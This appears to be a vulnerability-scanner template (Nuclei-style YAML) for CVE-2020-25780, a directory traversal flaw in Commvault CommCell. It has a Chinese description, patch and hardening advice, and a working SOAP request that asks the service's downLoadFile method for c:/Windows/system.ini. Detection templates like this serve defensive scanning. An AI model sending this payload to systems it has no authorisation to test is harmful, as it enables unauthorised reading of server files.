config/51pwn/yaml/CommCell/CVE-2020-25780.yaml

id: CVE-2020-25780
info:
  name: Commvault CommCell Directory Traversal
  author:
  - l0ne1y
  description: |-
    Commvault CommCell 任意文件下载漏洞
    Commvault CommCell 是美国Commvault公司的一款应用于企业环境的存储管理工具。

    Commvault CommCell 存在路径遍历漏洞，该漏洞源于尝试查看日志文件可以改为查看文件 在日志文件文件夹之外。以下产品及版本受到影响：14.68版本, 15.x系列15.58之前版本, 16.x系列16.44之前版本, 17.x系列17.29之前版本, 18.x系列18.13之前版本。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    http://kb.commvault.com/article/63264

    临时修复方案：
    1、过滤\".\"，使用户在url中不能回溯上级目录。
    2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。
    3、禁止系统提供目录遍历服务。
    4、文件路径保存至数据库，让用户提交文件对应ID下载文件。
    5、用户下载文件之前进行权限校验。
requests:
- matchers:
  - type: word
    words:
    - downLoadFileResult
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - http://{{Host}}:81/SearchSvc/CVSearchService.svc
  method: POST
  body: |
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
       <soapenv:Header/>
       <soapenv:Body>
          <tem:downLoadFile>
             <tem:path>c:/Windows/system.ini</tem:path>
          </tem:downLoadFile>
       </soapenv:Body>
    </soapenv:Envelope>
  headers:
    Cookie: Login
    content-type: text/xml
    soapaction: http://tempuri.org/ICVSearchSvc/downLoadFile
